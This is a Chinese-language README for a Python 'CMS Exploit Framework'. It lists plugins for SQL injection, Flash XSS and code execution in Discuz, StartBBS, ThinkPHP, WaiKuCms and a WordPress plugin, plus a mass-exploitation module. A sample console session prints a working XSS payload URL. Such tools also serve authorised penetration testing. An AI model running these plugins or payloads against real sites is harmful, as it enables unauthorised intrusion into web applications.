CMS Exploit Framework
=====================

简介
---------------------
CMS Exploit Framework 是一款 CMS 漏洞利用框架，通过它可以很容易地获取、开发 CMS 漏洞利用插件并对目标应用进行测试。

安装
---------------------
本框架采用 Python 语言开发，并且第三方依赖包都已打包，所以您所需要做的只是下载、启动。

```
chu@sh3ll-me:/tmp » git clone https://github.com/chuhades/CMS-Exploit-Framework.git
Cloning into 'CMS-Exploit-Framework'...
remote: Counting objects: 352, done.
remote: Compressing objects: 100% (182/182), done.
remote: Total 352 (delta 159), reused 347 (delta 154)
Receiving objects: 100% (352/352), 463.62 KiB | 16.00 KiB/s, done.
Resolving deltas: 100% (159/159), done.
Checking connectivity... done.
chu@sh3ll-me:/tmp » cd CMS-Exploit-Framework
chu@sh3ll-me:/tmp/CMS-Exploit-Framework » python console.py

 _______________________
< CMS Exploit Framework >
 -----------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

+ -- --=[ CMS Exploit Framework - 2014/10/10 ]
+ -- --=[ 6 CMS                              ]
+ -- --=[ 11 Plugins                         ]

CMS Exploit Framework >
```

使用
---------------------
框架内输入 ```help``` 可查看详细的帮助信息，一般来讲，基本的使用步骤如下：

```
chu@sh3ll-me:/tmp/CMS-Exploit-Framework » python console.py

 _______________________
< CMS Exploit Framework >
 -----------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

+ -- --=[ CMS Exploit Framework - 2014/10/10 ]
+ -- --=[ 6 CMS                              ]
+ -- --=[ 11 Plugins                         ]

CMS Exploit Framework > help

Core Commands
=============

Command                       Description
-------                       -----------
help                          Help menu
use <plugin>                  Select a plugin by name
vulns                         List all vulnerabilities in the database
update                        Update the framework
vulns -d                      Clear all vulnerabilities in the database
exploit                       Run current plugin
vulns -o <plugin>             Save vulnerabilities to file
search <keyword>              Search plugin names and descriptions
set <option> <value>          Set a variable to a value
rebuild_db                    Rebuild the database
info <plugin>                 Display information about one plugin
list                          List all plugins
version                       Show the framework version numbers
exit                          Exit the console
options                       Display options for current plugin

CMS Exploit Framework > list

Plugins
=======

Name                                    Scope                                   Description
----                                    -----                                   -----------
discuz_faq_gids_sqli                    Discuz 7.1-7.2                          /faq.php 参数 gids 未初始化 导致 SQL 注入
discuz_flvplayer_flash_xss              Discuz! x3.0                            /static/image/common/flvplayer.swf Flash XSS
multi_autopwn                           All CMS                                 漏洞批量利用模块
multi_demo                              Demo                                    Plugin Demo
multi_whatweb                           All CMS                                 CMS 识别
startbbs_search_q_sqli                  StartBBS 1.1.5.2                      /themes/default/search.php 参数 q 未过滤导致 SQL 注入
startbbs_swfupload_flash_xss            StartBBS -1.1.5.3                       StartBBS swfupload.swf Flash XSS
thinkphp_dispatcher_code_exec           ThinkPHP 2.1,2.2,3.0                    Dispatcher.class.php 代码执行
thinkphp_lite_code_exec                 ThinkPHP 3.0,3.1.2,3.1.3                ThinkPHP 以 lite 模式启动时存在代码执行漏洞
waikucms_search_code_exec               WaiKuCms 2.0/20130612                   Search.html 参数 keyword 代码执行
wordpress_all_in_one_seo_pack_xss       All in One SEO Pack 1.3.6.4 - 2.0.3     WordPress All in One SEO Pack 插件低版本反射型 XSS

CMS Exploit Framework > info multi_whatweb

           Name: multi_whatweb
            CMS: multi
          Scope: All CMS

Author:
	Chu <root@sh3ll.me>

Description:
	CMS 识别

Reference:
	http://sh3ll.me/

CMS Exploit Framework > use multi_whatweb
CMS Exploit Framework > multi_whatweb > options

	Name                Current Setting                         Required  Description
	----                ---------------                         --------  -----------
	URL                                                         True      网站地址
	Thread              10                                      True      线程数

CMS Exploit Framework > multi_whatweb > set URL http://xxoo.com
URL => http://xxoo.com
CMS Exploit Framework > multi_whatweb > exploit
[+]http://xxoo.com: discuz
CMS Exploit Framework > multi_whatweb > search discuz

Matching Plugins
================

Name                                    Scope                                   Description
----                                    -------                                 -----------
discuz_faq_gids_sqli                    Discuz 7.1-7.2                          /faq.php 参数 gids 未初始化 导致 SQL 注入
discuz_flvplayer_flash_xss              Discuz! x3.0                            /static/image/common/flvplayer.swf Flash XSS

CMS Exploit Framework > multi_whatweb > info discuz_flvplayer_flash_xss

           Name: discuz_flvplayer_flash_xss
            CMS: discuz
          Scope: Discuz! x3.0

Author:
	Chu <root@sh3ll.me>

Description:
	/static/image/common/flvplayer.swf Flash XSS

Reference:
	http://www.ipuman.com/pm6/138/

CMS Exploit Framework > multi_whatweb > use discuz_flvplayer_flash_xss
CMS Exploit Framework > discuz_flvplayer_flash_xss > options

	Name                Current Setting                         Required  Description
	----                ---------------                         --------  -----------
	URL                                                         True      网站地址

CMS Exploit Framework > discuz_flvplayer_flash_xss > set URL http://xxoo.com
URL => http://xxoo.com
CMS Exploit Framework > discuz_flvplayer_flash_xss > exploit
[*]Requesting target site
[+]Exploitable!
[+]http://xxoo.com/static/image/common/flvplayer.swf?file=1.flv&linkfromdisplay=true&link=javascript:alert(1);
CMS Exploit Framework > discuz_flvplayer_flash_xss > vulns

Vulns
=====

Plugin                                  Vuln
------                                  ----
multi_whatweb                           http://xxoo.com: discuz
discuz_flvplayer_flash_xss              http://xxoo.com/static/image/common/flvplayer.swf?file=1.flv&linkfromdisplay=true&link=javascript:alert(1);

CMS Exploit Framework > discuz_flvplayer_flash_xss >
```
详细的使用说明请见项目 Wiki。

插件开发
---------------------
框架托管于 Github，插件开发请参考 [/plugins/multi/demo.py](https://github.com/chuhades/CMS-Exploit-Framework/blob/master/plugins/multi/demo.py)，然后 pull request。

详细的开发文档请见项目 Wiki。

作者
---------------------
- ID: Chu
- Team: 网络尖刀
- Mail: [root@sh3ll.me](mailto:root@sh3ll.me)
- Weibo: [@Chu______](http://weibo.com/chuhades)
- Blog: [http://sh3ll.me/](http://sh3ll.me/)
